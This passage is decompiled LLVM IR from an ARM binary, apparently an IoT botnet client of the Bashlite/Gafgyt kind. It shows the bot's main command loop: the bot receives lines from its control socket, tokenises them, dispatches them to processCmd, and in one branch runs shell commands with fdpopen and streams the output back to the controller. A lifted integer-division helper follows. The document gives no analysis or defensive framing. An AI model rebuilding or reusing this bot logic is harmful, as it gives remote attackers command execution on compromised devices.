  store i32 1024, i32* @r2, align 4
  %v3_12198 = call i32 @__GI_memset(i8* %v2_12198, i32 0)
  %v6_121b8 = call i32 @szprintf(i32 %v2_12188, i32 ptrtoint ([8 x i8]* @global_var_1c630.807 to i32), i32 %v1_12104, i32 %v2_12188, i32 ptrtoint (i32* @0 to i32))
  %v3_121d4 = call i32 @fdpopen(i32 %v2_12188, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_1c5cc.780, i32 0, i32 0))
  br label %dec_label_pc_12240

dec_label_pc_121e4:                               ; preds = %dec_label_pc_12240
  %v2_121f4 = call i32 @trim(i8* %v2_12198)
  %v2_121fc = load i32, i32* @global_var_265cc.54, align 4
  store i32 %v2_12188, i32* @r2, align 4
  %v3_12218 = call i32 @sockprintf(i32 %v2_121fc, i32 ptrtoint ([3 x i8]* @global_var_1c638.809 to i32))
  store i32 1024, i32* @r2, align 4
  %v3_12234 = call i32 @__GI_memset(i8* %v2_12198, i32 0)
  %v1_1223c = call i32 @sleep(i32 1)
  br label %dec_label_pc_12240

dec_label_pc_12240:                               ; preds = %dec_label_pc_12180, %dec_label_pc_121e4
  %v4_12258 = call i32 @fdgets(i32 %v2_12188, i32 1024, i32 %v3_121d4, i32 %v2_12188)
  %v2_12260 = icmp eq i32 %v4_12258, 0
  br i1 %v2_12260, label %dec_label_pc_12268, label %dec_label_pc_121e4

dec_label_pc_12268:                               ; preds = %dec_label_pc_12240
  %v1_1226c = call i32 @fdpclose(i32 %v3_121d4)
  %v1_12274 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_12278

dec_label_pc_12278:                               ; preds = %dec_label_pc_12154, %dec_label_pc_12268
  store i32 %v1_12104, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1c63c.811 to i32), i32* @r1, align 4
  %v2_1228c = call i32 @__GI_strtok(i32 %v1_12104, i32 ptrtoint (i32* @global_var_1c63c.811 to i32))
  store i32 %v1_12030, i32* %stack_var_-624, align 4
  %v2_1239446 = icmp eq i32 %v2_1228c, 0
  br i1 %v2_1239446, label %dec_label_pc_1239c, label %dec_label_pc_122a4

dec_label_pc_122a4:                               ; preds = %dec_label_pc_12278, %dec_label_pc_1237c
  %stack_var_-36.049.in = phi i32 [ %v2_12384, %dec_label_pc_1237c ], [ %v2_1228c, %dec_label_pc_12278 ]
  %stack_var_-40.147 = phi i32 [ %stack_var_-40.0, %dec_label_pc_1237c ], [ 1, %dec_label_pc_12278 ]
  %stack_var_-36.049 = inttoptr i32 %stack_var_-36.049.in to i8*
  %v2_122a8 = load i8, i8* %stack_var_-36.049, align 1
  %v7_122ac = icmp eq i8 %v2_122a8, 10
  br i1 %v7_122ac, label %dec_label_pc_1237c, label %dec_label_pc_122b4

dec_label_pc_122b4:                               ; preds = %dec_label_pc_122a4
  store i32 %stack_var_-40.147, i32* @r4, align 4
  %v3_122c0 = call i32 @strlen(i8* nonnull %stack_var_-36.049)
  %v1_122c8 = add i32 %v3_122c0, 1
  %v1_122d0 = call i32 @malloc(i32 %v1_122c8)
  %v0_122e4 = load i32, i32* @r4, align 4
  %v3_122e4 = mul i32 %v0_122e4, 4
  %v2_122f0 = add i32 %v2_122ec, %v3_122e4
  %v2_122f4 = inttoptr i32 %v2_122f0 to i32*
  store i32 %v1_122d0, i32* %v2_122f4, align 4
  %v3_12304 = mul i32 %stack_var_-40.147, 4
  %v2_1230c = add i32 %v3_12304, %v19_117f8
  %v2_12310 = add i32 %v2_1230c, -600
  %v1_12314 = inttoptr i32 %v2_12310 to i32*
  %v2_12314 = load i32, i32* %v1_12314, align 4
  store i32 %v2_12314, i32* @r4, align 4
  %v3_12320 = call i32 @strlen(i8* nonnull %stack_var_-36.049)
  %v1_12328 = add i32 %v3_12320, 1
  %v0_1232c = load i32, i32* @r4, align 4
  store i32 %v1_12328, i32* @r2, align 4
  %v2_1233c = inttoptr i32 %v0_1232c to i8*
  %v3_1233c = call i32 @__GI_memset(i8* %v2_1233c, i32 0)
  %v2_1235c = load i32, i32* %v1_12314, align 4
  %v4_1236c = call i32 @strcpy(i32 %v2_1235c, i8* nonnull %stack_var_-36.049)
  %v1_12374 = add i32 %stack_var_-40.147, 1
  br label %dec_label_pc_1237c

dec_label_pc_1237c:                               ; preds = %dec_label_pc_122a4, %dec_label_pc_122b4
  %stack_var_-40.0 = phi i32 [ %stack_var_-40.147, %dec_label_pc_122a4 ], [ %v1_12374, %dec_label_pc_122b4 ]
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1c63c.811 to i32), i32* @r1, align 4
  %v2_12384 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1c63c.811 to i32))
  %v2_12394 = icmp eq i32 %v2_12384, 0
  br i1 %v2_12394, label %dec_label_pc_1239c, label %dec_label_pc_122a4

dec_label_pc_1239c:                               ; preds = %dec_label_pc_1237c, %dec_label_pc_12278
  %stack_var_-40.1.lcssa = phi i32 [ 1, %dec_label_pc_12278 ], [ %stack_var_-40.0, %dec_label_pc_1237c ]
  %v3_123a8 = call i32 @processCmd(i32 %stack_var_-40.1.lcssa, i32* nonnull %stack_var_-624)
  %v7_123b4 = icmp slt i32 %stack_var_-40.1.lcssa, 2
  br i1 %v7_123b4, label %dec_label_pc_12410.outer, label %dec_label_pc_123cc.lr.ph

dec_label_pc_123cc.lr.ph:                         ; preds = %dec_label_pc_1239c
  br label %dec_label_pc_123cc

dec_label_pc_123cc:                               ; preds = %dec_label_pc_123cc.lr.ph, %dec_label_pc_123cc
  %storemerge15127 = phi i32 [ 1, %dec_label_pc_123cc.lr.ph ], [ %v1_123f8, %dec_label_pc_123cc ]
  %v3_123d8 = mul i32 %storemerge15127, 4
  %v2_123e0 = add i32 %v3_123d8, %v19_117f8
  %v2_123e4 = add i32 %v2_123e0, -600
  %v1_123e8 = inttoptr i32 %v2_123e4 to i32*
  %v2_123e8 = load i32, i32* %v1_123e8, align 4
  store i32 %v2_123e8, i32* @r0, align 4
  %v0_123f0 = call i32 @free()
  %v1_123f8 = add nuw nsw i32 %storemerge15127, 1
  %v5_1240c = icmp slt i32 %v1_123f8, %stack_var_-40.1.lcssa
  br i1 %v5_1240c, label %dec_label_pc_123cc, label %dec_label_pc_12410.outer

dec_label_pc_12410.outer:                         ; preds = %dec_label_pc_123cc, %dec_label_pc_11f90, %dec_label_pc_12170, %dec_label_pc_1239c, %dec_label_pc_11fec, %dec_label_pc_11ba0
  %stack_var_-96.2.ph = phi i32 [ %stack_var_-96.0.ph19, %dec_label_pc_11ba0 ], [ %stack_var_-96.1, %dec_label_pc_11fec ], [ %stack_var_-96.1, %dec_label_pc_1239c ], [ %stack_var_-96.1, %dec_label_pc_12170 ], [ %stack_var_-96.1, %dec_label_pc_11f90 ], [ %stack_var_-96.1, %dec_label_pc_123cc ]
  br label %dec_label_pc_12410

dec_label_pc_12410:                               ; preds = %dec_label_pc_12410.outer, %dec_label_pc_11f1c
  %v2_12414 = load i32, i32* @global_var_265cc.54, align 4
  %v5_12430 = call i32 @recvLine(i32 %v2_12414, i8* %v4_12430, i32 4096, i32 %v2_12420)
  %v3_12440 = icmp eq i32 %v5_12430, -1
  br i1 %v3_12440, label %dec_label_pc_11b84.outer, label %dec_label_pc_11e4c

; uselistorder directives
  uselistorder i32 %v5_12430, { 1, 0 }
  uselistorder i32 %storemerge15127, { 1, 0 }
  uselistorder i32 %stack_var_-40.1.lcssa, { 2, 0, 1 }
  uselistorder i32 %v2_12384, { 1, 0 }
  uselistorder i8* %stack_var_-36.049, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-40.147, { 1, 3, 0, 2 }
  uselistorder i8* %storemerge7, { 1, 0 }
  uselistorder i32 %v1_1213c, { 1, 0 }
  uselistorder i8* %storemerge743, { 1, 0 }
  uselistorder i32 %v1_12104, { 1, 2, 0 }
  uselistorder i32 %v2_1207c, { 1, 2, 0 }
  uselistorder i8* %v5_12034, { 5, 0, 3, 2, 1, 4, 6, 8, 7 }
  uselistorder i32 %v1_12030, { 3, 0, 2, 1, 4, 5 }
  uselistorder i8* %storemerge8, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v1_11f68, { 1, 2, 0 }
  uselistorder i1 %v9_11e80, { 1, 0 }
  uselistorder i32 %v3_11e94, { 3, 2, 5, 0, 1, 4 }
  uselistorder i32 %v5_11dcc, { 1, 0 }
  uselistorder i32 %v3_11e00, { 1, 2, 0, 3 }
  uselistorder i32 %v3_11d74, { 1, 0 }
  uselistorder i32 %v1_11d58, { 1, 0 }
  uselistorder i32 %v5_11c9c, { 1, 0 }
  uselistorder i32 %v1_11c2c, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_12188, { 2, 4, 3, 5, 1, 0 }
  uselistorder i8* %v4_12430, { 3, 0, 1, 2 }
  uselistorder i32 %v2_12420, { 6, 2, 3, 4, 5, 0, 1 }
  uselistorder i32 %v3_11a94, { 1, 0, 2 }
  uselistorder i32 %v2_119f8, { 0, 1, 3, 2 }
  uselistorder i32 %stack_var_-88.0, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-1648, { 1, 2, 0, 3 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1c63c.811 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32, i32)* @fdgets, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @szprintf, { 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38 }
  uselistorder i32 ()* @listFork, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i32* @global_var_265d4.72, { 2, 3, 0, 4, 5, 6, 7, 1, 8 }
  uselistorder i32* @global_var_2c854.75, { 0, 2, 3, 4, 5, 6, 7, 1, 8, 9 }
  uselistorder i32 (i32, i32)* @sockprintf, { 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 21, 0 }
  uselistorder i32* @global_var_2c848.477, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32* @global_var_265cc.54, { 2, 3, 4, 5, 0, 1, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32 (i32)* @sleep, { 2, 1, 0 }
  uselistorder i32 30, { 0, 1, 4, 2, 3 }
  uselistorder i32 ()* @initConnection, { 1, 0 }
  uselistorder i32 -600, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 0 }
  uselistorder i32 (i32)* @zprintf, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_fork, { 4, 3, 2, 1, 0 }
  uselistorder [2 x i8]* @global_var_1c5cc.780, { 1, 0 }
  uselistorder i32 ptrtoint ([2 x i8]* @global_var_1c5cc.780 to i32), { 3, 1, 2, 0 }
  uselistorder i32 (i32)* @init_rand, { 1, 0 }
  uselistorder i32 (i32)* @srand, { 2, 1, 0 }
  uselistorder i32 (i32*)* @__GI_time, { 5, 6, 21, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 1, 2, 3, 4, 19, 20, 17, 18 }
  uselistorder label %dec_label_pc_12410.outer, { 0, 3, 2, 4, 1, 5 }
  uselistorder label %dec_label_pc_123cc, { 1, 0 }
  uselistorder label %dec_label_pc_1237c, { 1, 0 }
  uselistorder label %dec_label_pc_122a4, { 1, 0 }
  uselistorder label %dec_label_pc_12278, { 1, 0 }
  uselistorder label %dec_label_pc_12240, { 1, 0 }
  uselistorder label %dec_label_pc_12118, { 1, 0 }
  uselistorder label %dec_label_pc_120f4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_120e4, { 1, 0 }
  uselistorder label %dec_label_pc_12064, { 1, 0 }
  uselistorder label %dec_label_pc_11fcc, { 1, 0 }
  uselistorder label %dec_label_pc_11f90, { 1, 0 }
  uselistorder label %dec_label_pc_11eb8, { 1, 0 }
  uselistorder label %dec_label_pc_11e40, { 1, 0 }
  uselistorder label %dec_label_pc_11db0, { 1, 0 }
  uselistorder label %dec_label_pc_11c80, { 1, 0 }
  uselistorder label %dec_label_pc_11b94, { 1, 0 }
  uselistorder label %dec_label_pc_11b84.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11b68, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11adc, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_119b4, { 1, 0 }
  uselistorder label %dec_label_pc_11940, { 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_124a0 = add i32 %arg2, -1
  %v7_124a0 = icmp eq i32 %arg2, 1
  br i1 %v7_124a0, label %bb, label %bb80

bb:                                               ; preds = %entry
  %v2_124a4 = load i32, i32* @r0, align 4
  ret i32 %v2_124a4

bb80:                                             ; preds = %entry
  %v2_124a0 = icmp eq i32 %arg2, 0
  br i1 %v2_124a0, label %dec_label_pc_12588, label %dec_label_pc_124ac

dec_label_pc_124ac:                               ; preds = %bb80
  %v0_124ac = load i32, i32* @r0, align 4
  %tmp = icmp ugt i32 %v0_124ac, %arg2
  br i1 %tmp, label %dec_label_pc_124b4, label %dec_label_pc_12540

dec_label_pc_124b4:                               ; preds = %dec_label_pc_124ac
  %v2_124b4 = and i32 %v1_124a0, %arg2
  %v4_124b4 = icmp eq i32 %v2_124b4, 0
  br i1 %v4_124b4, label %dec_label_pc_1254c, label %dec_label_pc_124bc

dec_label_pc_124bc:                               ; preds = %dec_label_pc_124b4
  %v3_124bc = icmp ult i32 %arg2, 536870912
  br i1 %v3_124bc, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_124bc
  %v4_124c0 = mul i32 %arg2, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_124bc, %.thread
  %v0_124e0.pr36.ph = phi i32 [ %v4_124c0, %.thread ], [ %arg2, %dec_label_pc_124bc ]
  %storemerge135 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_124bc ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb83
  %v0_124e0.pr36 = phi i32 [ %v4_124d4, %bb83 ], [ %v0_124e0.pr36.ph, %.preheader.preheader ]
  %v1_124d8 = phi i32 [ %v4_124d8, %bb83 ], [ %storemerge135, %.preheader.preheader ]
  %v2_124cc = icmp ugt i32 %v0_124e0.pr36, 268435455
  br i1 %v2_124cc, label %.thread2, label %bb81

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_124e0thread-pre-split.loopexit

bb81:                                             ; preds = %.preheader
  %v4_124d0 = icmp ult i32 %v0_124e0.pr36, %v0_124ac
  br i1 %v4_124d0, label %bb82, label %dec_label_pc_124e0thread-pre-split.loopexit.loopexit

bb82:                                             ; preds = %bb81
  %v2_124d4 = and i32 %v0_124e0.pr36, 268435456
  %v3_124d4 = icmp eq i32 %v2_124d4, 0
  %v4_124d4 = mul i32 %v0_124e0.pr36, 16
  br i1 %v3_124d4, label %bb83, label %dec_label_pc_124e0.loopexit

bb83:                                             ; preds = %bb82
  %v2_124d8 = and i32 %v1_124d8, 268435456
  %v3_124d8 = icmp eq i32 %v2_124d8, 0
  %v4_124d8 = mul i32 %v1_124d8, 16
  br i1 %v3_124d8, label %.preheader, label %dec_label_pc_124e0thread-pre-split.loopexit.loopexit

dec_label_pc_124e0thread-pre-split.loopexit.loopexit: ; preds = %bb83, %bb81
  %v1_124ec48.ph = phi i32 [ %v1_124d8, %bb81 ], [ %v4_124d8, %bb83 ]
  %v0_124e0.pr38.ph = phi i32 [ %v0_124e0.pr36, %bb81 ], [ %v4_124d4, %bb83 ]
  br label %dec_label_pc_124e0thread-pre-split.loopexit

dec_label_pc_124e0thread-pre-split.loopexit:      ; preds = %dec_label_pc_124e0thread-pre-split.loopexit.loopexit, %.thread2
  %v1_124ec48 = phi i32 [ %v1_124d8, %.thread2 ], [ %v1_124ec48.ph, %dec_label_pc_124e0thread-pre-split.loopexit.loopexit ]
  %v0_124e0.pr38 = phi i32 [ %v0_124e0.pr36, %.thread2 ], [ %v0_124e0.pr38.ph, %dec_label_pc_124e0thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_124e0thread-pre-split

dec_label_pc_124e0thread-pre-split:               ; preds = %dec_label_pc_124e0thread-pre-split.loopexit, %bb85
  %v1_124ec46 = phi i32 [ %v1_124ec48, %dec_label_pc_124e0thread-pre-split.loopexit ], [ %v3_124ec, %bb85 ]
  %v0_124e0.pr = phi i32 [ %v0_124e0.pr38, %dec_label_pc_124e0thread-pre-split.loopexit ], [ %v3_124e8, %bb85 ]
  br label %dec_label_pc_124e0

dec_label_pc_124e0.loopexit:                      ; preds = %bb82
  br label %dec_label_pc_124e0

dec_label_pc_124e0:                               ; preds = %dec_label_pc_124e0.loopexit, %dec_label_pc_124e0thread-pre-split
  %v1_124ec = phi i32 [ %v1_124ec46, %dec_label_pc_124e0thread-pre-split ], [ %v1_124d8, %dec_label_pc_124e0.loopexit ]
  %v1_124e8 = phi i32 [ %v0_124e0.pr, %dec_label_pc_124e0thread-pre-split ], [ %v4_124d4, %dec_label_pc_124e0.loopexit ]
  %v2_124e0 = icmp slt i32 %v1_124e8, 0
  br i1 %v2_124e0, label %dec_label_pc_124f4, label %bb84

bb84:                                             ; preds = %dec_label_pc_124e0
  %v4_124e4 = icmp ult i32 %v1_124e8, %v0_124ac
  br i1 %v4_124e4, label %bb85, label %dec_label_pc_124f4

bb85:                                             ; preds = %bb84
  %v3_124e8 = mul i32 %v1_124e8, 2
  %v2_124ec = icmp slt i32 %v1_124ec, 0
  %v3_124ec = mul i32 %v1_124ec, 2
  br i1 %v2_124ec, label %dec_label_pc_124f4, label %dec_label_pc_124e0thread-pre-split

dec_label_pc_124f4:                               ; preds = %bb84, %dec_label_pc_124e0, %bb85
  %v2_1250059 = phi i32 [ %v3_124ec, %bb85 ], [ %v1_124ec, %bb84 ], [ %v1_124ec, %dec_label_pc_124e0 ]
  %v1_124f851 = phi i32 [ %v3_124e8, %bb85 ], [ %v1_124e8, %bb84 ], [ %v1_124e8, %dec_label_pc_124e0 ]
  br label %dec_label_pc_124f8

dec_label_pc_124f8:                               ; preds = %.thread11, %dec_label_pc_124f4
  %v1_1252c = phi i32 [ %v4_1252c, %.thread11 ], [ %v2_1250059, %dec_label_pc_124f4 ]
  %v1_12500 = phi i32 [ %v0_12538, %.thread11 ], [ 0, %dec_label_pc_124f4 ]
  %v1_12530 = phi i32 [ %v4_12530, %.thread11 ], [ %v1_124f851, %dec_label_pc_124f4 ]
  %v1_124fc = phi i32 [ %v0_12528, %.thread11 ], [ %v0_124ac, %dec_label_pc_124f4 ]
  %v3_124f8 = icmp ult i32 %v1_124fc, %v1_12530
  br i1 %v3_124f8, label %.thread7, label %bb86

bb86:                                             ; preds = %dec_label_pc_124f8
  %v3_124fc = sub i32 %v1_124fc, %v1_12530
  %v3_12500 = or i32 %v1_12500, %v1_1252c
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_124f8, %bb86
  %v1_12508 = phi i32 [ %v1_124fc, %dec_label_pc_124f8 ], [ %v3_124fc, %bb86 ]
  %v1_1250c = phi i32 [ %v1_12500, %dec_label_pc_124f8 ], [ %v3_12500, %bb86 ]
  %v4_12504 = udiv i32 %v1_12530, 2
  %v6_12504 = icmp ult i32 %v1_12508, %v4_12504
  br i1 %v6_12504, label %.thread8, label %bb87

bb87:                                             ; preds = %.thread7
  %v3_12508 = urem i32 %v1_12530, 2
  %v4_12508 = icmp eq i32 %v3_12508, 0
  %v6_12508 = sub i32 %v1_12508, %v4_12504
  br i1 %v4_12508, label %.thread8, label %bb88

bb88:                                             ; preds = %bb87
  %v5_1250c = udiv i32 %v1_1252c, 2
  %v6_1250c = or i32 %v1_1250c, %v5_1250c
  br label %.thread8

.thread8:                                         ; preds = %bb87, %.thread7, %bb88
  %v1_12514 = phi i32 [ %v6_12508, %bb87 ], [ %v1_12508, %.thread7 ], [ %v6_12508, %bb88 ]
  %v1_12518 = phi i32 [ %v1_1250c, %bb87 ], [ %v1_1250c, %.thread7 ], [ %v6_1250c, %bb88 ]
  %v4_12510 = udiv i32 %v1_12530, 4
  %v6_12510 = icmp ult i32 %v1_12514, %v4_12510
  br i1 %v6_12510, label %.thread9, label %bb89

bb89:                                             ; preds = %.thread8
  %v3_12514 = and i32 %v1_12530, 2
  %v4_12514 = icmp eq i32 %v3_12514, 0
  %v6_12514 = sub i32 %v1_12514, %v4_12510
  br i1 %v4_12514, label %.thread9, label %bb90

bb90:                                             ; preds = %bb89
  %v5_12518 = udiv i32 %v1_1252c, 4
  %v6_12518 = or i32 %v1_12518, %v5_12518
  br label %.thread9

.thread9:                                         ; preds = %bb89, %.thread8, %bb90
  %v1_12520 = phi i32 [ %v6_12514, %bb89 ], [ %v1_12514, %.thread8 ], [ %v6_12514, %bb90 ]
  %v1_12524 = phi i32 [ %v1_12518, %bb89 ], [ %v1_12518, %.thread8 ], [ %v6_12518, %bb90 ]
  %v4_1251c = udiv i32 %v1_12530, 8
  %v6_1251c = icmp ult i32 %v1_12520, %v4_1251c
  br i1 %v6_1251c, label %thread-pre-split, label %bb91

bb91:                                             ; preds = %.thread9
  %v3_12520 = and i32 %v1_12530, 4
  %v4_12520 = icmp eq i32 %v3_12520, 0
  %v6_12520 = sub i32 %v1_12520, %v4_1251c
  br i1 %v4_12520, label %thread-pre-split, label %bb92

bb92:                                             ; preds = %bb91
  %v5_12524 = udiv i32 %v1_1252c, 8
  %v6_12524 = or i32 %v1_12524, %v5_12524
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb92, %.thread9, %bb91
  %v0_12538 = phi i32 [ %v1_12524, %bb91 ], [ %v1_12524, %.thread9 ], [ %v6_12524, %bb92 ]
  %v0_12528 = phi i32 [ %v6_12520, %bb91 ], [ %v1_12520, %.thread9 ], [ %v6_12520, %bb92 ]
  %v2_12528 = icmp eq i32 %v0_12528, 0
  br i1 %v2_12528, label %dec_label_pc_12538, label %bb93

bb93:                                             ; preds = %thread-pre-split
  %tmp140 = icmp ult i32 %v1_1252c, 16
  br i1 %tmp140, label %dec_label_pc_12538, label %.thread11

.thread11:                                        ; preds = %bb93
  %v4_1252c = udiv i32 %v1_1252c, 16
  %v4_12530 = udiv i32 %v1_12530, 16
  br label %dec_label_pc_124f8

dec_label_pc_12538:                               ; preds = %thread-pre-split, %bb93
  ret i32 %v0_12538

dec_label_pc_12540:                               ; preds = %dec_label_pc_124ac
  %v9_124ac = icmp eq i32 %v0_124ac, %arg2
  %. = zext i1 %v9_124ac to i32
  ret i32 %.

dec_label_pc_1254c:                               ; preds = %dec_label_pc_124b4
  %v2_1254c = icmp ugt i32 %arg2, 65535
  br i1 %v2_1254c, label %bb97, label %.thread16

bb97:                                             ; preds = %dec_label_pc_1254c
  %v2_12550 = and i32 %arg2, 32768
  %v3_12550 = icmp eq i32 %v2_12550, 0
  %v4_12550 = udiv i32 %arg2, 65536
  br i1 %v3_12550, label %.thread16, label %bb98

.thread16:                                        ; preds = %bb97, %dec_label_pc_1254c
  %v0_1255c65 = phi i32 [ %arg2, %dec_label_pc_1254c ], [ %v4_12550, %bb97 ]
  br label %bb98

bb98:                                             ; preds = %bb97, %.thread16
  %v1_12560 = phi i32 [ %v0_1255c65, %.thread16 ], [ %v4_12550, %bb97 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb97 ]
  %v2_1255c = icmp ugt i32 %v1_12560, 255
  br i1 %v2_1255c, label %bb99, label %.thread17

bb99:                                             ; preds = %bb98
  %v2_12560 = and i32 %v1_12560, 128
  %v3_12560 = icmp eq i32 %v2_12560, 0
  %v4_12560 = udiv i32 %v1_12560, 256
  br i1 %v3_12560, label %.thread17, label %bb100

bb100:                                            ; preds = %bb99
  %v2_12564 = or i32 %storemerge, 8
  br label %.thread17

.thread17:                                        ; preds = %bb99, %bb98, %bb100
  %v1_12570 = phi i32 [ %storemerge, %bb98 ], [ %storemerge, %bb99 ], [ %v2_12564, %bb100 ]
  %v1_1256c = phi i32 [ %v1_12560, %bb98 ], [ %v4_12560, %bb99 ], [ %v4_12560, %bb100 ]
  %v2_12568 = icmp ugt i32 %v1_1256c, 15
  br i1 %v2_12568, label %bb101, label %.thread18

bb101:                                            ; preds = %.thread17
  %v2_1256c = and i32 %v1_1256c, 8
  %v3_1256c = icmp eq i32 %v2_1256c, 0
  %v4_1256c = udiv i32 %v1_1256c, 16
  br i1 %v3_1256c, label %.thread18, label %bb102

bb102:                                            ; preds = %bb101
  %v2_12570 = add nsw i32 %v1_12570, 4
  br label %.thread18

.thread18:                                        ; preds = %bb101, %.thread17, %bb102
  %v4_12578 = phi i32 [ %v1_12570, %.thread17 ], [ %v1_12570, %bb101 ], [ %v2_12570, %bb102 ]
  %v5_1257c = phi i32 [ %v1_1256c, %.thread17 ], [ %v4_1256c, %bb101 ], [ %v4_1256c, %bb102 ]
  %v2_12574 = icmp ugt i32 %v5_1257c, 3
  %v7_12574 = icmp eq i32 %v5_1257c, 4
  %v2_12578 = xor i1 %v7_12574, true
  %v3_12578 = and i1 %v2_12574, %v2_12578
  br i1 %v3_12578, label %bb103, label %bb104

bb103:                                            ; preds = %.thread18
  %v5_12578 = add nsw i32 %v4_12578, 3
  br label %bb104

bb104:                                            ; preds = %.thread18, %bb103
  %v4_1257c = phi i32 [ %v4_12578, %.thread18 ], [ %v5_12578, %bb103 ]
  %v2_1257c = xor i1 %v2_12574, true
  %v3_1257c = or i1 %v7_12574, %v2_1257c
  br i1 %v3_1257c, label %bb105, label %bb106

bb105:                                            ; preds = %bb104
  %v8_1257c = udiv i32 %v5_1257c, 2
  %v9_1257c = add i32 %v4_1257c, %v8_1257c
  br label %bb106

bb106:                                            ; preds = %bb104, %bb105
  %v1_12580 = phi i32 [ %v4_1257c, %bb104 ], [ %v9_1257c, %bb105 ]
  %v6_12580 = lshr i32 %v0_124ac, %v1_12580
  ret i32 %v6_12580

dec_label_pc_12588:                               ; preds = %bb80
  %v0_12588 = load i32, i32* @lr, align 4
  %v0_1258c = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_12588)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_1257c, { 1, 0 }
  uselistorder i1 %v7_12574, { 1, 0 }
  uselistorder i32 %v4_1256c, { 1, 0 }
  uselistorder i32 %v1_1256c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_12560, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_12560, { 1, 0, 2, 3 }
  uselistorder i32 %v4_12550, { 1, 0 }
  uselistorder i32 %v0_12528, { 1, 0 }
  uselistorder i32 %v4_1251c, { 1, 0 }
  uselistorder i32 %v1_12524, { 1, 2, 0 }
  uselistorder i32 %v4_12510, { 1, 0 }
  uselistorder i32 %v1_12518, { 1, 2, 0 }
  uselistorder i32 %v4_12504, { 1, 0 }
  uselistorder i32 %v1_1250c, { 1, 2, 0 }
  uselistorder i32 %v1_12530, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_12500, { 1, 0 }
  uselistorder i32 %v1_1252c, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_124ec, { 1, 0 }
  uselistorder i32 %v3_124e8, { 1, 0 }
  uselistorder i32 %v1_124e8, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_124ec, { 1, 2, 0, 3 }
  uselistorder i32 %v4_124d8, { 1, 0 }
  uselistorder i32 %v4_124d4, { 2, 1, 0 }
  uselistorder i32 %v1_124d8, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_124e0.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v0_124ac, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %arg2, { 8, 12, 7, 6, 5, 10, 11, 0, 9, 1, 4, 2, 3 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb98, { 1, 0 }
  uselistorder label %dec_label_pc_12538, { 1, 0 }
